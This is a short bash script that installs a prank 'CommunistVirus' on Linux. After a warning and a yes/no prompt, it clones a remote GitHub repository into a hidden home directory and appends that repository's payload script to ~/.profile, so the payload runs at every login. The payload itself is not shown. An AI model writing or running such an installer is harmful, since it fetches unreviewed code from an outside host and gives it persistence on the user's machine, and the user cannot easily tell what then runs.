#!/usr/bin/env bash

# Warn user
echo "CommunistVirus - A port of the communist virus to Linux!"
echo -e "\033[31;5;1;7mWARNING! I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR DEVICES\033[0m"

read -p "Continue? (y/N) " -n 1 -r
## For some reason the script breaks at this point (a letter dissapears), so im just adding this comment
## to fix it
if [[ $REPLY =~ ^[Yy]$ ]]
then
	# Make directory, git clone to directory
	mkdir ~/.communistVirus/
	git clone https://github.com/daniel071/communistVirusLinux.git ~/.communistVirus/

	# Make backup of profile file
	cp ~/.profile ./profile_backup

	# Add to auto start up
	echo "~/.communistVirus/payload/main.sh" >> ~/.profile

	# epic, it is done
	echo -e "\033[1;32mInstallation was successfull! \033[0m"
fi
